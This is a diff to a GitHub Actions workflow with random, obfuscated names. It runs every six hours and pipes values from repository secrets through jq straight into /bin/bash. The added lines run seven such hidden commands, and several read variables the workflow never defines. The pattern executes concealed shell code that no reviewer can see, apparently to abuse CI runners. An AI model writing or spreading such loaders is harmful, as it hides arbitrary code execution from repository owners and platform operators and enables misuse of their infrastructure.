@@ -2,7 +2,7 @@ name: muhong19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 0/6 * * *'
+    - cron: '54 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,9 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: muhong19871010
         env:
-          npz9: ${{ secrets.npz9 }}
+          fyap240: ${{ secrets.fyap240 }}
         run: |
-          echo $npz9 | jq -r .bo15801 | /bin/bash
-          echo $zcdjz5071 | jq -r .kfwoa891 | /bin/bash
-          echo $n220 | jq -r .nvxmm19 | /bin/bash
+          echo $fyap240 | jq -r .kr95 | /bin/bash
+          echo $n3 | jq -r .vobe22566 | /bin/bash
+          echo $uhe27 | jq -r .nit02543 | /bin/bash
+          echo $mptr0680 | jq -r .wa15 | /bin/bash
+          echo $ccncs580 | jq -r .ksyjl9253 | /bin/bash
+          echo $g4880 | jq -r .s619 | /bin/bash
+          echo $osyv48786 | jq -r .eqyse874 | /bin/bash
 
